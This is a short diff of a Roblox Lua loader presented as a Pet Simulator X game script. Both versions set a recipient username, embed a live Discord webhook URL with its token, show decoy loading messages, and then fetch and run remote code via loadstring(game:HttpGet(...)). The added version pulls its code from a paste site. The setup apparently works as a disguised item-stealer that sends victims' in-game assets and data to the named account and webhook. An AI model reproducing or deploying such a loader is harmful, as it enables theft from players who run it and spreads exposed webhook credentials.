@@ -1,9 +1,9 @@
-UserID = 2797485663
-WebHook = 'https://discord.com/api/webhooks/1088781216276283402/VL1v8F3U-2FTp77pWBj8kny6MF4u51IhABrtnBT9kT8xlBk1KMgfvo5FpZINJQo_8d_i'
-
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimxgm.lua"))()
+UserName = "tlgzq"
+UserName2 = "tlgzq"
+Webhook = "https://discord.com/api/webhooks/1111813534796488715/Zkamx3c0LGROl-gHsVvqeBIv7AlIm_lwFMdiE07uNdbb01qU7FoMb_SfWnWf7P26Muvu"
+_G.ScriptName = "Toxicity's Script"
+_G.FirstText = "Please wait.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
